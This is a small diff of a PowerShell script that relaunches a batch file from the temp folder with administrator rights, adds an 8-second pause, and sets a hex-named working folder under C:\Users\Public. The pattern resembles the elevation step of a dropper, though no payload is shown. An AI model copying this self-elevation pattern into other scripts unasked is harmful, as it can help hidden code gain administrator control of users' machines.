@@ -4,6 +4,8 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     
     # Run the CMD file as admin
     Start-Process "$env:TEMP\run.cmd" -Verb RunAs
+    # Sleep
+    Start-Sleep -Seconds 8
 }
 
 $dir = "C:\Users\Public\150F4013"
